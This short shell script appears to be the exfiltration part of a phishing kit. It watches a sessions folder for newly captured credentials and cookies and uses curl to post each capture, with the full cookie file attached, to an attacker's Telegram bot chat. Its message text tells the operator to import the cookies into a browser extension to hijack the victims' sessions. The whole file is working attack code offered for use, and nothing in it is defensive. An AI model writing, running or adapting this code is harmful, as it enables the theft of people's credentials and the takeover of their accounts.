#!/bin/sh
# Watches /app/sessions and pushes every newly captured session
# (credentials + cookies) to a Telegram chat.

DIR=/app/sessions
TOKEN="$TG_BOT_TOKEN"
CHAT="$TG_CHAT_ID"
API="https://api.telegram.org/bot$TOKEN"

[ -n "$TOKEN" ] && [ -n "$CHAT" ] || exit 0

seen="$(mktemp)"

send() {
    # 1. Human-readable summary
    curl -s -X POST "$API/sendMessage" \
        -d chat_id="$CHAT" \
        -d text="$1" >/dev/null 2>&1
    # 2. Full raw session file (contains ALL cookies for import)
    curl -s -F chat_id="$CHAT" \
        -F document=@"$2" "$API/sendDocument" >/dev/null 2>&1
}

while :; do
    for f in "$DIR"/*.json; do
        [ -e "$f" ] || continue
        grep -qxF "$f" "$seen" 2>/dev/null && continue
        echo "$f" >> "$seen"

        # Only send sessions that actually contain captured data
        if grep -q '"username"' "$f" 2>/dev/null; then
            NAME=$(basename "$f")
            CREDS=$(grep -o '"username": *"[^"]*"' "$f" | head -1)
            send "🎣 New capture: $NAME
$CREDS
Full cookies attached (import into a session-import browser extension or EditThisCookie)." "$f"
        fi
    done
    sleep 10
done
